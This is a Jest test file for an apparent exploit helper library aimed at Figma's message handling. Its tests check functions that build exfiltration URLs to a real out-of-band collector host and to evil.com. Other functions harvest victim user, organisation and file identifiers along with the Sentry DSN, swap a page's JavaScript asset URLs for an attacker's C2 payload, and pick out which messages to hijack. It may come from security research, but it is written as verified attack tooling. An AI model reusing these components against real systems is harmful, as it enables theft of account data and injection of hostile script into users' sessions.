const {
  DEFAULT_OOB,
  buildExfilUrl,
  extractVictimData,
  truncateMessageData,
  poisonAssetMap,
  shouldPoisonMessage,
} = require('../lib/payload-utils');

describe('payload-utils', () => {
  // ── buildExfilUrl ─────────────────────────────────────────
  describe('buildExfilUrl', () => {
    it('concatenates host and tag', () => {
      expect(buildExfilUrl(DEFAULT_OOB, 'victim')).toBe(
        'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com/p?t=victim'
      );
    });

    it('works with arbitrary hosts and tags', () => {
      expect(buildExfilUrl('https://evil.com', 'pm')).toBe(
        'https://evil.com/p?t=pm'
      );
    });
  });

  // ── extractVictimData ─────────────────────────────────────
  describe('extractVictimData', () => {
    it('extracts all expected fields', () => {
      const opts = {
        user_id: 'u123',
        file_key: 'fk456',
        org_id: 'org789',
        cluster: 'us-east',
        sentry_dsn: 'https://sentry.io/xyz',
        git_commit: 'abc123',
        extra_field: 'ignored',
      };
      const loc = { origin: 'https://figma.com', href: 'https://figma.com/file/abc' };
      const result = extractVictimData(opts, loc);

      expect(result).toEqual({
        user_id: 'u123',
        file_key: 'fk456',
        org_id: 'org789',
        cluster: 'us-east',
        sentry_dsn: 'https://sentry.io/xyz',
        git_commit: 'abc123',
        origin: 'https://figma.com',
        href: 'https://figma.com/file/abc',
      });
      expect(result).not.toHaveProperty('extra_field');
    });

    it('returns undefined for missing optional fields', () => {
      const result = extractVictimData({}, { origin: '', href: '' });
      expect(result.user_id).toBeUndefined();
      expect(result.file_key).toBeUndefined();
    });
  });

  // ── truncateMessageData ───────────────────────────────────
  describe('truncateMessageData', () => {
    it('returns short strings unchanged', () => {
      expect(truncateMessageData('hello')).toBe('hello');
    });

    it('truncates strings longer than 500 chars', () => {
      const long = 'x'.repeat(600);
      expect(truncateMessageData(long)).toBe('x'.repeat(500));
    });

    it('JSON-stringifies non-string data before truncating', () => {
      const obj = { key: 'a'.repeat(600) };
      const result = truncateMessageData(obj);
      expect(result.length).toBe(500);
      expect(result.startsWith('{"key":')).toBe(true);
    });

    it('supports custom max length', () => {
      expect(truncateMessageData('abcdef', 3)).toBe('abc');
    });
  });

  // ── poisonAssetMap ────────────────────────────────────────
  describe('poisonAssetMap', () => {
    it('replaces .js entries with the C2 URL', () => {
      const assets = {
        'app.js': '/original/app.js',
        'vendor.js': '/original/vendor.js',
        'style.css': '/original/style.css',
        'image.png': '/original/image.png',
      };
      const result = poisonAssetMap(assets, 'https://evil.com/payload.js');

      expect(result['app.js']).toBe('https://evil.com/payload.js');
      expect(result['vendor.js']).toBe('https://evil.com/payload.js');
      expect(result['style.css']).toBe('/original/style.css');
      expect(result['image.png']).toBe('/original/image.png');
    });

    it('does not mutate the original object', () => {
      const assets = { 'a.js': 'orig' };
      const result = poisonAssetMap(assets, 'evil');
      expect(assets['a.js']).toBe('orig');
      expect(result['a.js']).toBe('evil');
    });

    it('handles empty asset maps', () => {
      expect(poisonAssetMap({}, 'evil')).toEqual({});
    });
  });

  // ── shouldPoisonMessage ───────────────────────────────────
  describe('shouldPoisonMessage', () => {
    it('returns true for update-asset-url-map with assets', () => {
      expect(
        shouldPoisonMessage({ type: 'update-asset-url-map', assets: { 'a.js': 'x' } })
      ).toBe(true);
    });

    it('returns false when type is wrong', () => {
      expect(
        shouldPoisonMessage({ type: 'other', assets: {} })
      ).toBe(false);
    });

    it('returns false when assets is missing', () => {
      expect(
        shouldPoisonMessage({ type: 'update-asset-url-map' })
      ).toBe(false);
    });

    it('returns false for null/undefined', () => {
      expect(shouldPoisonMessage(null)).toBe(false);
      expect(shouldPoisonMessage(undefined)).toBe(false);
    });
  });
});
